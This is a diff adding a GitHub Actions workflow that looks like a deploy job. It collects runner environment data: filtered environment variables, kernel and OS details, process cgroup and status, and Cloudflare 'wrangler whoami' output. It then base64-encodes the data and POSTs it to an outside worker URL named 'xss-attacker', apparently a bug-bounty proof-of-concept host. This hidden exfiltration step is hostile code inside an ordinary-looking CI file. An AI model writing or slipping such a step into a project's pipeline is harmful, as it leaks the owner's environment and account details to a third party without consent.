@@ -1,0 +1,74 @@
+name: Probe CI Environment
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    name: Probe runner environment and deploy
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+
+      - name: Install dependencies
+        run: npm install
+
+      - name: Gather CI environment info
+        id: probe
+        env:
+          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
+          CLOUDFLARE_ACCOUNT_ID: 31ae559d77eca719a4b168aed8ba1c64
+        run: |
+          echo "=== PRINTENV ==="
+          printenv | sort | grep -v "SECRET\|TOKEN\|KEY\|PASSWORD\|PASS" || true
+          
+          echo "=== UNAME ==="
+          uname -a
+          
+          echo "=== OS RELEASE ==="
+          cat /etc/os-release 2>/dev/null || true
+          
+          echo "=== PROC SELF STATUS ==="
+          cat /proc/self/status 2>/dev/null | head -20 || true
+          
+          echo "=== PROC SELF CGROUP ==="
+          cat /proc/self/cgroup 2>/dev/null || true
+          
+          echo "=== WRANGLER WHOAMI ==="
+          npx wrangler@latest whoami 2>&1 || true
+          
+          echo "=== NETWORK TEST ==="
+          curl -s --max-time 5 https://1.1.1.1/dns-query?name=cloudflare.com&type=A 2>/dev/null | head -5 || true
+
+      - name: Post env to logging worker
+        env:
+          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
+        run: |
+          # Gather data and POST to logging worker
+          UNAME=$(uname -a | base64 -w0)
+          OS_RELEASE=$(cat /etc/os-release 2>/dev/null | base64 -w0)
+          CGROUP=$(cat /proc/self/cgroup 2>/dev/null | base64 -w0)
+          PROC_STATUS=$(cat /proc/self/status 2>/dev/null | head -30 | base64 -w0)
+          ENV_VARS=$(printenv | sort | grep -v "SECRET\|TOKEN\|KEY\|PASSWORD\|_PASS" | base64 -w0)
+          
+          WRANGLER_WHO=$(npx wrangler@latest whoami 2>&1 | base64 -w0)
+          
+          PAYLOAD="{\"source\":\"github-actions\",\"uname\":\"$UNAME\",\"os_release\":\"$OS_RELEASE\",\"cgroup\":\"$CGROUP\",\"proc_status\":\"$PROC_STATUS\",\"env_vars\":\"$ENV_VARS\",\"wrangler_whoami\":\"$WRANGLER_WHO\"}"
+          
+          curl -s -X POST "https://cf-mcp-xss-attacker.mohammadmseet-h1-proof.workers.dev/x?d=probe-v4-gha"             -H "Content-Type: application/json"             -d "$PAYLOAD" || true
+          
+          echo "Posted to logging worker"
+
+      - name: Deploy worker
+        env:
+          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
+          CLOUDFLARE_ACCOUNT_ID: 31ae559d77eca719a4b168aed8ba1c64
+        run: |
+          npx wrangler@latest deploy 2>&1
